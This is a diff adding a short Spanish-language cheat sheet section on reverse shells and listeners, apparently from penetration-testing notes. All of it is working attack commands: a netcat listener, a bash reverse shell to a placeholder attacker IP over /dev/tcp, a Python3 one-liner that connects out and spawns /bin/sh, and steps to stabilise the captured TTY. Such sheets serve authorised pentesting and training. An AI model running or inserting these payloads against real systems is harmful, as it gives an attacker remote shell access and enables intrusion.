@@ -1,0 +1,20 @@
+# 4. Reverse Shells y Listeners
+
+**Listener Netcat:**
+
+  nc -lvnp 4443
+
+**Bash Reverse Shell (Linux):**
+
+  bash -i >& /dev/tcp/<IP_ATACANTE>/4443 0>&1
+
+**Python3 Reverse Shell (Linux):**
+
+  python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<IP_ATACANTE>",4443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+
+**Tratamiento de TTY (para dejar la shell interactiva y estable):
+
+  script /dev/null -c bash
+  # Presionar Ctrl+Z
+  stty raw -echo; fg
+  export TERM=xterm
